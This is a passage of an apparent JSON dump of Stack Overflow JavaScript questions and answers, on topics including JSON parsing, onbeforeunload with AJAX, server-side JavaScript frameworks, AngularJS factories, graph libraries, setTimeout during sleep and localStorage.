            "body": "<p>I'm using Sencha Touch (ExtJS) to get a JSON message from the server. The message I receive is this one :</p>\n\n<pre><code>{\n\"success\": true,\n\"counters\": [\n    {\n        \"counter_name\": \"dsd\",\n        \"counter_type\": \"sds\",\n        \"counter_unit\": \"sds\"\n    },\n    {\n        \"counter_name\": \"gdg\",\n        \"counter_type\": \"dfd\",\n        \"counter_unit\": \"ds\"\n    },\n    {\n        \"counter_name\": \"sdsData\",\n        \"counter_type\": \"sds\",\n        \"counter_unit\": \"   dd       \"\n    },\n    {\n        \"counter_name\": \"Stoc final\",\n        \"counter_type\": \"number    \",\n        \"counter_unit\": \"litri     \"\n    },\n    {\n        \"counter_name\": \"Consum GPL\",\n        \"counter_type\": \"number    \",\n        \"counter_unit\": \"litri     \"\n    },\n    {\n        \"counter_name\": \"sdg\",\n        \"counter_type\": \"dfg\",\n        \"counter_unit\": \"gfgd\"\n    },\n    {\n        \"counter_name\": \"dfgd\",\n        \"counter_type\": \"fgf\",\n        \"counter_unit\": \"liggtggggri     \"\n    },\n    {\n        \"counter_name\": \"fgd\",\n        \"counter_type\": \"dfg\",\n        \"counter_unit\": \"kwfgf       \"\n    },\n    {\n        \"counter_name\": \"dfg\",\n        \"counter_type\": \"dfg\",\n        \"counter_unit\": \"dg\"\n    },\n    {\n        \"counter_name\": \"gd\",\n        \"counter_type\": \"dfg\",\n        \"counter_unit\": \"dfg\"\n    }\n\n    ]\n}\n</code></pre>\n\n<p>My problem is that I can't parse this JSON object so that i can use each of the counter objects.</p>\n\n<p>I'm trying to acomplish that like this :</p>\n\n<pre><code>var jsonData = Ext.util.JSON.decode(myMessage);\nfor (var counter in jsonData.counters) {\n     console.log(counter.counter_name);\n }\n</code></pre>\n\n<p>What am i doing wrong ?\nThank you!</p>\n",
            "last_activity_date": 1402905959,
            "question_id": 9991805,
            "score": 18,
            "tags": [
                "javascript",
                "json",
                "extjs"
            ],
            "title": "Javascript how to parse JSON array"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>This is really weird, are you sure your Ajax call isn't loading a new link?</p>\n\n<p>Be sure you read this relevant specification: <a href=\"http://msdn.microsoft.com/en-us/library/ms536907(VS.85).aspx\" rel=\"nofollow\">onbeforeunload spec</a></p>\n\n<p>See if the Ajax call maybe triggers any of the actions listed in the <strong>To invoke</strong> table.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>If you're talking about ASP.NET AJAX partial postbacks, then I encountered this behavior today too, doing the exact same thing.  (If you're not, ignore my post completely.)</p>\n\n<p>In my experience so far, it seems like if your partial postback is triggered by an <strong><em>input</em></strong>, it won't fire onbeforeunload during a partial postback, but if the partial postback is triggered by a <strong><em>hyperlink</em></strong>, it will.  It seems like the browser assumes you're navigating away if you click on anything in an anchor tag (only tested in IE and FireFox but yeah).</p>\n\n<p>Whether or not the page has a certain hidden field is already what I was using to determine client-side when it's appropriate to show the navigate away warning, so I was able to fix this very simply by adding a check of the hidden field's value to my onbeforeunload's if condition, and hooking into the PageRequestManager's BeginRequest and EndRequest handlers to set the value.  That effectively disables the warning during partial postbacks.  You could add more complicated logic here if there were more specific things you wanted to check.</p>\n\n<p>Here's a really over-simplified code sample. (sorry if i pared and censored to the point where it doesn't work but it should give you an idea.)</p>\n\n<pre><code>window.onbeforeunload = checkNavigateAway;\n\nSys.WebForms.PageRequestManager.getInstance().add_beginRequest(onBeginRequest);\nSys.WebForms.PageRequestManager.getInstance().add_endRequest(onEndRequest);\n\nfunction onBeginRequest(sender, args) {\n    var navigateAwayFlag = $(\"input[id*='navigateAwayValue']\");\n    if (navigateAwayFlag.length &gt; 0) {\n        navigateAwayFlag[0].value = \"false\";\n    }\n}\n\nfunction onEndRequest(sender, args) {\n    var navigateAwayFlag = $(\"input[id*='navigateAwayValue']\");\n    if (navigateAwayFlag.length &gt; 0) {\n        navigateAwayFlag[0].value = \"true\";\n    }\n}\n\nfunction checkNavigateAway() {\n    var navigateAwayFlag = $(\"input[id*='navigateAwayValue']\");\n    if (navigateAwayFlag.length &gt; 0 &amp;&amp; navigateAwayFlag[0].value == \"true\")\n    {\n        return \"Warning Text\";\n    }\n}\n</code></pre>\n\n<p><strong>Edit</strong>: Bad news.  The above doesn't seem to work in IE6.  It seems like it fires events in a different order than Firefox, so the onbeforeunload fires before the AJAX beginRequest...  May have to find a way to change the flag's value via the hyperlink click before the onbeforeunload fires.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I did something like this:</p>\n\n<p>inside body tag:</p>\n\n<pre><code>  var allowConfirm = true;\n\n  window.onbeforeunload = confirmExit;\n  function confirmExit()\n  {\n    if(allowConfirm)\n        return \"Are you sure you want to navigate away from this page?\";\n    else\n        allowConfirm = true;\n  }\n</code></pre>\n\n<p>When I Logout, I call this script:</p>\n\n<p>allowConfirm = false; return window.location.href; </p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>If you want to trigger your postback by a hyperlink, there is a simple workaround:\nInstead of </p>\n\n<p><code>&lt;a href=\"javascript:submitFunction();\"&gt;Submit&lt;/a&gt;</code></p>\n\n<p>or</p>\n\n<p><code>&lt;a href=\"javascript:;\" onclick=\"submitFunction();\"&gt;Submit&lt;/a&gt;</code></p>\n\n<p>just use this code:</p>\n\n<p><code>&lt;a href=\"#\" onclick=\"submitFunction();\"&gt;Submit&lt;/a&gt;</code></p>\n\n<p>It seems that IE fires the onbeforeunload event if the content of the href-attribute of a hyperlink is not the current page (which the sharp character indicates).</p>\n",
                    "is_accepted": false,
                    "score": 28
                },
                {
                    "body": "<p>This actually works:</p>\n\n<pre><code> OnClientClick=\"eval(this.href);return false\" \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>In the case of IE6 or href you can hook the postback function.\ni.e.: if the postback function is <code>WebForm_DoPostBackWithOptions</code> and using Jquery , add this code below to code above</p>\n\n<pre><code>var DoPostBackWithOptionsHook = null;\n\n$(document).ready(function(){\n  DoPostBackWithOptionsHook = WebForm_DoPostBackWithOptions;\n  WebForm_DoPostBackWithOptions = WebForm_DoPostBackWithOptionsHook;\n}\n\nfunction WebForm_DoPostBackWithOptionsHook(options) {\n    var navigateAwayFlag = $(\"input[id*='navigateAwayValue']\");\n       if (navigateAwayFlag.length &gt; 0) {\n           navigateAwayFlag[0].value = \"false\"; }\n\n    return DoPostBackWithOptionsHook(options)\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>One workaround to this problem is to call submitFunction() on click event of hyperlink tag using jquery and remove the href attribute from the hyperlink.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>that's not possible, there is no way to find out if the refresh button of browser was pressed.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have an AJAX-based grid control. </p>\n\n<p>We hook into the window.onbeforeunload event to check if they have unsaved data and if so present them with a message \"Are you sure you want to navigate away...you have unsaved data...\".</p>\n\n<p>All this is good.</p>\n\n<p>But AJAX calls also trigger window.onbeforeunload and so if the grid has unsaved data and we make an AJAX call (such as to delete a row in another grid) the user gets the \"Are you sure you want to navigate away...you have unsaved data...\" message which is not good.</p>\n\n<p>Is it possible to suppress the onbeforeunload event for AJAX calls? Or is it possible to detect that a call <em>is</em> an AJAX call? Otherwise we'll have to get hacking!</p>\n\n<p>Thanks</p>\n",
            "last_activity_date": 1353377661,
            "question_id": 537702,
            "score": 18,
            "tags": [
                "javascript",
                "ajax",
                "onbeforeunload"
            ],
            "title": "Can I prevent window.onbeforeunload from being called when doing an AJAX call"
        },
        {
            "answer_count": 12,
            "answers": [
                {
                    "body": "<p>Have you looked at <a href=\"http://dev.helma.org/\" rel=\"nofollow\">Helma</a>?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I haven't used it yet myself, but I've been following the progress of <strong><a href=\"http://peter.michaux.ca/index#Synergy\" rel=\"nofollow\">Synergy</a></strong>. Might be worth a look.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>To the best of my knowledge, <a href=\"http://www.aptana.com/jaxer\" rel=\"nofollow\">Jaxer</a> is the most production-ready server-side environment right now. There's a great editor, good and controlled code sharing between the server and the client, and programming paradigms that let you look at pages as a DOM tree on the server. You can also opt for deployment in the cloud if you like, or simply install it on a regular apache stack. DB support is a bit flaky, and an MVC framework and an ORM are currently missing, but I believe support is being added quickly.</p>\n\n<p>If I were to do JS on the server, it would be Jaxer.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You might want to look at <a href=\"https://phobos.dev.java.net/\" rel=\"nofollow\">Phobos</a> as well.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If you using CouchDB, I would strongly recommend you look at the latest version of Dojo. Version 1.2 has a CouchDB data store.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><a href=\"http://dev.helma.org/\" rel=\"nofollow\">Helma</a> is a powerful and well tested framework. It runs several of the larger websites in Austria.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I use Helma-ng. It can run on Google App Engine. Pretty cool :)\nhamen</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Have a look at <a href=\"http://www.mynajs.org\" rel=\"nofollow\">Myna</a>. It just went beta and has several advantages for web development:</p>\n\n<ul>\n<li><strong>Java Servlet</strong> Myna is a .war file that can be deployed on top of any Java servlet container, so you have a lot of flexibility in deployment platform. The Myna \"server\" package is just 20MB and includes a lightweight servlet container and startup scripts for Linux and windows</li>\n<li><strong>No built-in framework</strong> Simply create .sjs files in the webroot and they are interpreted as server-side JavaScript. No need for complicated application or package definitions. </li>\n<li><strong>Web Based Administration</strong> Tasks such as defining data sources, JS compiler settings, and centralized log management are handled via a web-based administrator</li>\n<li><strong>Templating</strong> Myna includes a simple template language that can be used directly in .ejs files or embedded in JS code to handle multi-line strings. This can make SQL much more readable.</li>\n<li><strong>SQL queries</strong> including SQL Parameters, connection pooling, and caching</li>\n<li><strong>Run time Object Relational Mapping</strong> Treats Database rows as objects with getters and setters without the need to pre-define the tables. Myna uses database metadata to construct data access objects at run time.</li>\n<li><strong>Caching</strong> User-defined query and fragment caching and automatic <a href=\"http://en.wikipedia.org/wiki/HTTP%5FETag\" rel=\"nofollow\">ETag</a> calculations</li>\n<li><strong>Web Services</strong> Myna can server the same <a href=\"http://www.mynajs.org/shared/docs/js/libOO/files/WebService-sjs.html\" rel=\"nofollow\">WebService</a> definition over SOAP, XML-RPC, JSON-RPC, Ext.Direct or Myna's own JSON-MYNA</li>\n<li><strong>RESTful verbs</strong> Myna can handle \"PUT\" and \"DELETE\" HTTP requests and provides access to the body content in text and binary form</li>\n<li><strong>Multi-threading</strong> Take advantage of multiple cores for faster processing of long running requests, or launch background tasks</li>\n<li><strong>Strong Cryptography</strong> provided by Google <a href=\"http://www.keyczar.org/\" rel=\"nofollow\">KeyCzar</a></li>\n<li><strong>Centralized Authentication with OpenID support</strong> Users and permissions can be manages centrally from the administrator</li>\n<li><strong>Customizable</strong> Most of the \"meat\" of Myna is written in JavaScript and can be modified and or replaced to suit specialized needs</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>How about Classic ASP / Jscript or even JScript.NET?</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Check out <a href=\"http://nodejs.org/\">Node.js</a> in action <a href=\"http://www.youtube.com/watch?v=jo_B4LTHi3I\">here</a>.</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p><a href=\"http://www.meteor.com\" rel=\"nofollow\">http://www.meteor.com</a> is awesome.</p>\n\n<p>I've been using webpy myself too but have been using Meteor recently.</p>\n\n<p>I actually coded something similar in Python with parts of it compiling to Javascript, but syncing JSON well is a tricky.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>..and now there is also, Wakanda:\n<a href=\"http://www.wakanda.org/\" rel=\"nofollow\">http://www.wakanda.org/</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>So I was writing a web application with <code>web.py</code> that uses plenty of client-side JavaScript code, and my database is on <a href=\"http://en.wikipedia.org/wiki/CouchDB\">CouchDB</a> so the queries are in JavaScript too, and eventually I just got to thinking, why not skip the Python and go all JavaScript?  Besides, some functions need to run once on the client and again on the server to make sure you're not spoofing, so why translate between JavaScript and Python?</p>\n\n<p>So I'm looking for a simple lightweight JavaScript web framework.  All I really need is the URL routing, request and response stuff (standard <a href=\"http://en.wikipedia.org/wiki/Web_Server_Gateway_Interface\">WSGI</a>?), and a way to hook into a big HTTP server like <a href=\"http://en.wikipedia.org/wiki/Nginx\">nginx</a>.  What is recommended?</p>\n",
            "last_activity_date": 1358303309,
            "question_id": 160863,
            "score": 18,
            "tags": [
                "javascript",
                "server-side"
            ],
            "title": "What&#39;s a good minimal server-side JavaScript framework?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>The purpose of moving your <code>studentSessions</code> service out of your controller is to achieve separation of concerns.  Your service's job is to know how to talk with the server and the controller's job is to translate between view data and server data.</p>\n\n<p>But you are confusing your asynchronous handlers and what is returning what.  The controller still needs to tell the service what to do when the data is received later...</p>\n\n<pre><code>studentApp.factory('studentSession', function($http){\n    return {\n        getSessions: function() {\n            return $http.post('/services', { \n                type : 'getSource',\n                ID    : 'TP001'\n            });\n        }\n    };\n});\n\nstudentApp.controller('studentMenu',function($scope, studentSession){\n    $scope.variableName = [];\n\n    var handleSuccess = function(data, status) {\n        $scope.variableName = data;\n        console.log($scope.variableName);\n    };\n\n    studentSession.getSessions().success(handleSuccess);\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 42
                }
            ],
            "body": "<p>I am trying to understand the concept of factory and service in Angular. I have the following code under the controller</p>\n\n<pre><code>init();\n\n    function init(){\n        $http.post('/services', { \n            type : 'getSource',\n            ID    : 'TP001'\n        }).\n        success(function(data, status) {\n            updateData(data);\n        }).\n        error(function(data, status) {\n\n        });\n\n        console.log(contentVariable);\n    };\n    function updateData(data){\n        console.log(data);\n    };\n</code></pre>\n\n<p>This code works fine. But when i move $http service into factory, i am not able to return data back to controller. </p>\n\n<pre><code>studentApp.factory('studentSessionFactory', function($http){\n    var factory = {};\n    factory.getSessions = function(){\n        $http.post('/services', { \n            type : 'getSource',\n            ID    : 'TP001'\n        }).\n        success(function(data, status) {\n            return data;\n        }).\n        error(function(data, status) {\n\n        });\n    };\n    return factory;\n});\n\nstudentApp.controller('studentMenu',function($scope, studentSessionFactory){\n    $scope.variableName = [];\n    init();\n    function init(){\n        $scope.variableName = studentSessionFactory.getSessions();\n        console.log($scope.variableName);\n    };\n});\n</code></pre>\n\n<p>Is there any advantage to using factory, since $http works even under controller</p>\n",
            "last_activity_date": 1424329990,
            "question_id": 16227644,
            "score": 17,
            "tags": [
                "javascript",
                "http",
                "angularjs"
            ],
            "title": "angularjs factory $http service"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Take a look at <a href=\"http://www.sencha.com/products/extjs/\" rel=\"nofollow\">EXT.js</a>, It can render to canvas, svg and mobile with the same code base. There's a lot more to the product than the visualization engine. It's a complete client-side framework. Well worth looking at.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>A few more options</p>\n\n<p><a href=\"http://javascript.open-libraries.com/utilities/drawing/10-best-javascript-drawing-and-canvas-libraries/\" rel=\"nofollow\">http://javascript.open-libraries.com/utilities/drawing/10-best-javascript-drawing-and-canvas-libraries/</a></p>\n\n<p>Or for sure you can thrust Raphael <a href=\"http://raphaeljs.com/\" rel=\"nofollow\">http://raphaeljs.com/</a> but it's svg </p>\n\n<p>Old School \n<a href=\"http://www.walterzorn.de/en/index.htm\" rel=\"nofollow\">http://www.walterzorn.de/en/index.htm</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I found exactly what I was looking for in <a href=\"http://cytoscape.github.io/cytoscape.js/\">Cytoscape</a></p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>It appears that <a href=\"http://d3js.org\">D3.js</a> (which you mentioned in you question) is the best JavaScript graphing library in existence. It's very quick, can handle force-based layouts, and allows zooming.</p>\n\n<p><a href=\"http://mbostock.github.io/d3/talk/20111116/force-collapsible.html\">Collapsible force-based layout example</a></p>\n\n<p><a href=\"http://stackoverflow.com/a/7907043/2892649\">Another answer on Stack Overflow</a> discusses D3.js zooming more thoroughly.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>SigmaJS is good for graphs in web page via JS.</p>\n\n<p><a href=\"http://sigmajs.org/\" rel=\"nofollow\">http://sigmajs.org/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Is there any good javascript library for drawing graphs in a webpage? I want a modern HTML5 library that preferably uses canvas and/or webgl. I <a href=\"http://sigmajs.org/\">have</a> <a href=\"http://dhotson.github.com/springy/demo.html\">found</a> <a href=\"http://www.ryandesign.com/canviz/\">a</a> <a href=\"http://collusion.toolness.org/\">couple</a> <a href=\"http://cytoscapeweb.cytoscape.org/demos\">of</a> <a href=\"http://arborjs.org/\">good</a> <a href=\"http://www.atomodo.com/flb/?e=13839,25793#\">web</a> <a href=\"http://kenneth.kufluk.com/google/js-mindmap/\">libraries</a> <a href=\"http://thejit.org/static/v20/Jit/Examples/ForceDirected/example1.html\">while</a> <a href=\"http://graphit-live.herokuapp.com/\">researching</a> but they don't scale to the size of graphs I am operating on (upto 2000 vertices+20000 edges) that a desktop software like <a href=\"https://gephi.org/\">Gephi</a> can easily handle or they are flash/silverlight-based. So, far, my best find is a <a href=\"https://github.com/mbostock/d3/wiki/\">d3.js</a> based <a href=\"http://bl.ocks.org/950642\">implementation</a>. It would be also nice if they had some automatic spring/force-based layouting/clustering <a href=\"http://www.aisee.com/manual/unix/56.htm\">algorithm</a> built-in too with <a href=\"http://zoom.it/\">Seadragon-style</a> <a href=\"http://sixdegrees.hu/last.fm/interactive_map.html\">zooming</a>.</p>\n",
            "last_activity_date": 1394104641,
            "question_id": 9490003,
            "score": 17,
            "tags": [
                "javascript",
                "canvas",
                "cluster-analysis",
                "webgl",
                "graph-visualization"
            ],
            "title": "Web based large scale graph drawing library"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>You are missing some code there, but I assume its part of an object declaration like this:</p>\n\n<pre><code>var obj = {\n  queryString: function() {\n    //some code\n  }\n};\nobj.queryString();\n</code></pre>\n\n<p>It assigns a function as a property of an object literal.  It would be equivalent to this:</p>\n\n<pre><code>var obj = {};\nobj.queryString = function() { ... };\nobj.queryString();\n</code></pre>\n\n<p>In general, the object literal syntax looks like this:</p>\n\n<pre><code>{ key: value, otherKey: otherValue };\n</code></pre>\n\n<p>So the reason this didn't work in the console is that it was not enclosed in <code>{}</code> characters, denoting an object literal.  And this syntax is valid ONLY in an object literal.</p>\n",
                    "is_accepted": true,
                    "score": 24
                },
                {
                    "body": "<p>The <code>:</code> is used when defining an object and it's properties.</p>\n\n<pre><code>var obj = {\n   queryString: function() {\n      //some code\n   }\n}\n</code></pre>\n\n<p>Now <code>obj.queryString</code> is your function.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>This is probably inside a map/object declaration like so:</p>\n\n<pre><code>var obj = {\n    queryString: function() {\n        alert('here');\n    },\n    eggs: function() {\n        alert('another function');\n    }\n};\n\nobj.queryString();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>What the </p>\n\n<pre><code>queryString: function() {\n\n//some code\n\n}\n</code></pre>\n\n<p>means is the you can use queryString() to call the function that it refers to. This kind referencing is generally used if you want to define a class(or a pseudo class ;P) in your javascript. Something like this,</p>\n\n<pre><code>var application= { namespace: {} };\n\napplication.namespace.class_name = function(){\n\n  function constructor(){\n   return {\n     exposed_property1 : property1,\n     exposed_property2 : property2,  \n     ...\n     ...\n    }\n   }\n  //Write property/functions that you want to expose.\n  // Write rest of the function that you want private as function private(){}\n};\n</code></pre>\n\n<p>So now at anyother part of the code you can create objects for class_name and use it to access the property1,property2 etc.,</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>It's a label <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label\" rel=\"nofollow\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label</a></p>\n\n<pre><code>var i, j;\n\nloop1:\nfor (i = 0; i &lt; 3; i++) {      //The first for statement is labeled \"loop1\"\n   loop2:\n   for (j = 0; j &lt; 3; j++) {   //The second for statement is labeled \"loop2\"\n      if (i == 1 &amp;&amp; j == 1) {\n         continue loop1;\n      }\n      console.log(\"i = \" + i + \", j = \" + j);\n   }\n}\n\n// Output is:\n//   \"i = 0, j = 0\"\n//   \"i = 0, j = 1\"\n//   \"i = 0, j = 2\"\n//   \"i = 1, j = 0\"\n//   \"i = 2, j = 0\"\n//   \"i = 2, j = 1\"\n//   \"i = 2, j = 2\"\n// Notice how it skips both \"i = 1, j = 1\" and \"i = 1, j = 2\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>What does this code refer too?\n</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>queryString: function() {\n\n//some code\n\n}\n</code></pre>\n\n<p>I tested it in the WebConsole (Firefox) but it wouldn't execute, so I'm thinking that it isn't equivalent to <code>function queryString() {}</code>.</p>\n\n<p>So what is it exactly?</p>\n",
            "last_activity_date": 1402617088,
            "question_id": 9384865,
            "score": 17,
            "tags": [
                "javascript",
                "anonymous-function",
                "colon-syntax"
            ],
            "title": "Javascript &#39;colon&#39; for labeling annonymous functions?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>The behavior is based on both the browser and the operating system. The OS handle sleep and individual apps have no say over it.</p>\n\n<p>What will most likely happen is that the OS will come back up with the same time remaining on the timer as when it was shut down. The other possibility is that it won't fire at all.</p>\n\n<p>If it is really a concern, you will probably want to be better safe than sorry and store a time stamp of when the token was initialized and use <code>setInterval</code> to check it periodically (say twice a minute).</p>\n\n<p>However, security should not be just a client side thing. Make sure that your server throws an error if an old / invalid token is used and that the Ajax behaves appropriately in response.</p>\n\n<p>[edit]\nI agree with the other post that it might fire immediately on the next tick. Resig's blog post is very good.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>In <a href=\"http://ejohn.org/blog/how-javascript-timers-work/\" rel=\"nofollow\">John Resig's blog</a> the timers are said to be using \"wall clock\". I believe that the events will fire immediately after the machine is resumed because setTimeout() doesn't guarantee an execution is a specific point in time but as soon as possible after the specified interval. However, I haven't checked it myself.</p>\n",
                    "is_accepted": true,
                    "score": 2
                },
                {
                    "body": "<p>As far as I've tested, it just stops and resumes after the computer wakes up. I suppose that means for a session depending on <code>setTimeout/Interval</code> the counter ticks on from the time the computer fell asleep.  </p>\n\n<p>I don't think you should rely on the accuracy of <code>setTimeout/Interval</code> for time critical stuff. For google chrome I <a href=\"http://stackoverflow.com/questions/6032429/chrome-timeouts-interval-suspended-in-background-tabs\">discovered recently</a> that any timeout/interval will be slowed down to once a second if the tab where it's activated looses focus.  </p>\n\n<p>Apart from that the accuracy of timeouts/intervals is dependent on other functions running etc. In short: it's not very accurate.</p>\n\n<p>So using interval and timeouts, checking the time against a starttime within the function started by it would give you better accuracy. Now if you start at 12:00, the computer goes to sleep and wakes up at 16:13 or so, checking 16:13 against 12:00 you are certain you have to renew the token.</p>\n",
                    "is_accepted": false,
                    "score": 18
                }
            ],
            "body": "<p>In a modern web browser, suppose I do a <code>setTimeout</code> for 10 minutes (at 12:00), and 5 minutes later put the computer to sleep, what should happen when the system wakes up again? What happens if it wakes up before the 10 minutes are up (at 12:09) or much later (at 16:00)?</p>\n\n<p>The reason I'm asking is because I'd like to have a new authentication token requested every 10 minutes, and I'm not sure if the browser will do the right thing and immediately request a new token if it wakes up after a long time. </p>\n\n<p><strong>Clarifications</strong>: I don't wan't to use cookies - I'm trying to build a web service here; and yes, the server will reject old and invalid tokens.</p>\n",
            "last_activity_date": 1364543610,
            "question_id": 6346849,
            "score": 17,
            "tags": [
                "javascript",
                "settimeout"
            ],
            "title": "What happens to setTimeout when the computer goes to sleep?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>You might find this useful:</p>\n\n<p><a href=\"http://slides.html5rocks.com/\">HTML5 Rocks</a></p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>Have a look at <a href=\"https://developer.mozilla.org/en/dom/storage\" rel=\"nofollow\"><em>MDC - DOM Storage</em></a> or <a href=\"http://dev.w3.org/html5/webstorage/\" rel=\"nofollow\"><em>W3C's Webstorage draft</em></a> (ok, less demo and more description). But the API is not that huge.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>Here's a <a href=\"http://jsfiddle.net/Benjol/HMEVd/\">jsfiddle</a> demo</p>\n\n<p>(copy of the associated js code, uses of localStorage are called out in the comments)</p>\n\n<pre><code>//Note that if you are writing a userscript, it is a good idea\n// to prefix your keys, to reduce the risk of collisions with other \n// userscripts or the page itself.\nvar prefix = \"localStorageDemo-\";\n\n$(\"#save\").click(function () { \n    var key = $(\"#key\").attr('value');\n    var value = $(\"#value\").attr('value');\n    localStorage.setItem(prefix + key, value);      //******* setItem()\n    //localStorage[prefix+key] = value; also works\n    RewriteFromStorage();\n});\n\nfunction RewriteFromStorage() {\n    $(\"#data\").empty();\n    for(var i = 0; i &lt; localStorage.length; i++)    //******* length\n    {\n        var key = localStorage.key(i);              //******* key()\n        if(key.indexOf(prefix) == 0) {\n            var value = localStorage.getItem(key);  //******* getItem()\n            //var value = localStorage[key]; also works\n            var shortkey = key.replace(prefix, \"\");\n            $(\"#data\").append(\n                $(\"&lt;div class='kvp'&gt;\").html(shortkey + \"=\" + value)\n                   .append($(\"&lt;input type='button' value='Delete'&gt;\")\n                           .attr('key', key)\n                           .click(function() {      //****** removeItem()\n                                localStorage.removeItem($(this).attr('key'));\n                                RewriteFromStorage();\n                            })\n                          )\n            );\n        }\n    }\n}\n\nRewriteFromStorage();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 19
                },
                {
                    "body": "<p><strong>Here is an example of HTML5's LocalStorage.</strong> </p>\n\n<p>Here is a fiddle <a href=\"http://jsfiddle.net/ccatto/G2SyC/2/\" rel=\"nofollow\">http://jsfiddle.net/ccatto/G2SyC/2/</a>  code demo example.</p>\n\n<p>A simple code would be:</p>\n\n<pre><code>// saving data into local storage\nlocalStorage.setItem('LocalStorageKey', txtboxFooValue);\n\n// getting data from localstorage\nvar retrivedValue = localStorage.getItem('LocalStorageKey', retrivedValue);\n</code></pre>\n\n<p>Here is a more complete code example where you enter text into a textbox and click a button. Then the text is stored into LocalStorage and retrieved and displayed in a div. </p>\n\n<pre><code>&lt;h2&gt;HTML LocalStorage Example&lt;/h2&gt;\n\n&lt;section&gt;\n    &lt;article&gt;\n        Web Storage example:\n        &lt;br /&gt;\n        &lt;div id=\"divDataLocalStorage\"&gt;&lt;/div&gt;\n        &lt;br /&gt;\n        Value\n        &lt;input type=\"text\" id=\"txtboxFooExampleLocalStorage\" /&gt;\n        &lt;input type=\"button\" id=\"btnSaveToLocalStorage\" value=\"Save Text to Local Storage\" /&gt;\n    &lt;/article&gt;\n&lt;/section&gt;\n&lt;script src=\"~/Scripts/jquery-1.8.2.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;    \n    console.log(\"start log\");  \n    $(\"#btnSaveToLocalStorage\").click(function () {\n        console.log(\"inside btnSaveToLocalStorage Click function\");\n        SaveToLocalStorage();\n    });\n\n    function SaveToLocalStorage(){\n        console.log(\"inside SaveToLocalStorage function\");\n        var txtboxFooValue = $(\"#txtboxFooExampleLocalStorage\").val();\n        console.log(\"text box Foo value  = \", txtboxFooValue);\n        localStorage.setItem('LocalStorageKey', txtboxFooValue);\n        console.log(\" after setItem in LocalStorage\");\n        RetrieveFromLocalStorage();\n    }\n\n    function RetrieveFromLocalStorage() {\n        console.log(\"inside Retrieve from LocalStorage\");\n        var retrivedValue = 'None';\n        var retrivedValue = localStorage.getItem('LocalStorageKey', retrivedValue);\n        $(\"#divDataLocalStorage\").text(retrivedValue);\n        console.log(\"inside end of retrieve from localstorge\");\n        console.log(\"retrieved value = \", retrivedValue);\n    }\n\n&lt;/script&gt;\n</code></pre>\n\n<p>Hope this helps!</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Local Storage is part of the HTML5 APIs - it is an object and we can access this object and its functionality via JavaScript. During this tutorial, we will use JavaScript to take a look at the fundamentals of the local storage object and how we can store and retrieve data, client side.</p>\n\n<p>Local storage items are set in key/value pairs, so for every item that we wish to store on the client (the end user\u2019s device), we need a key\u2014this key should be directly related to the data that it is stored alongside.</p>\n\n<p>There are multiple methods and an important property that we have access to, so let\u2019s get started.</p>\n\n<p>You would type this code into a HTML5 document, inside your script tags.</p>\n\n<h2>Setting Items</h2>\n\n<p>First up, we have the setItem() method, which takes our key/ value (or sometimes referred to as name/ value) pair as an argument. This method is very important, as it will allow us to actually store the data on the client; this method has no specific return value. The setItem() method looks just like this:</p>\n\n<pre><code>localStorage.setItem(\"Name\", \"Vamsi\");\n</code></pre>\n\n<h2>Getting Items</h2>\n\n<p>Now that we have had a look at storing some data, let\u2019s get some of that defined data out of local storage. To do this, we have the getItem() method, which takes a key as an argument and returns the 